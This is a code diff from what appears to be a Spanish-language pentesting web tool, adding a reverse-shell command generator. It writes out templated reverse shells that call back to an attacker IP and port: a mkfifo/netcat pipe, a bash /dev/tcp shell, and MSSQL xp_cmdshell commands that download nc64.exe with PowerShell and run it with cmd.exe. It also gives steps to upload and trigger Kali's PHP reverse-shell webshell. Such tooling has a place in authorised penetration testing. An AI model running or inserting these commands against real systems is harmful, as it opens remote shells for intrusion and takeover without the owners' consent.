+      📄 Usa el fichero de Kali en <code style="color:var(--orange)">/usr/share/webshells/php/php-reverse-shell.php</code><br>
+      Edita los campos <code style="color:var(--orange)">$ip = '${esc(ip)}';</code> y <code style="color:var(--orange)">$port = ${esc(port)};</code> con los valores introducidos arriba, súbelo al servidor y ejecútalo desde el navegador.</div>`;
+    return;
+  } else if(type==='php-mkfifo'){
+    cards=[{cmd:`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ${ip} ${port} >/tmp/f`, d:'PHP/Bash mkfifo — reverse shell vía named pipe', os:'linux'}];
+  } else if(type==='bash-tcp'){
+    cards=[{cmd:`bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`, d:'Bash /dev/tcp — reverse shell sin binarios externos', os:'linux'}];
+  } else if(type==='ps-nc'){
+    cards=[
+      {cmd:`EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://${ip}/nc64.exe -OutFile C:\\Users\\Public\\nc64.exe"';`, d:'1) Descargar nc64.exe vía PowerShell desde MSSQL (xp_cmdshell)', os:'windows'},
+      {cmd:`EXEC xp_cmdshell 'C:\\Users\\Public\\nc64.exe -e cmd.exe ${ip} ${port}';`, d:'2) Ejecutar nc64.exe para conectar de vuelta', os:'windows'},
+    ];
+  }
+  out.innerHTML=cards.map(c=>{
+    const cj=JSON.stringify(c.cmd);
+    return `<div class="enum-cmd-card">
+      <div class="enum-cmd-row" style="align-items:flex-start;">
+        <div class="enum-cmd-code" style="white-space:pre-wrap;word-break:break-all;">${esc(c.cmd)}</div>
+        <button class="enum-copy-btn" onclick='enumCopy(this,${cj})'>⎘ Copiar</button>
+        <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${cj},${JSON.stringify(c.d)},${JSON.stringify(c.os)},"Reverse Shell","revshell",["revshell"])'>💾</button>
+      </div>
+      <div class="enum-cmd-desc">${esc(c.d)}</div>
+    </div>`;
+  }).join('');
 }
 
 async function saveNmapResult(btn){
@@ -3791,7 +4221,7 @@ async function saveNmapResult(btn){
 }
 
 function switchEnumTab(name){
-  ['discovery','services','nmap'].forEach(t=>{
+  ['discovery','services','nmap','winad'].forEach(t=>{
     document.getElementById('esec-'+t).classList.toggle('show',t===name);
     document.getElementById('estab-'+t).classList.toggle('active',t===name);
   });
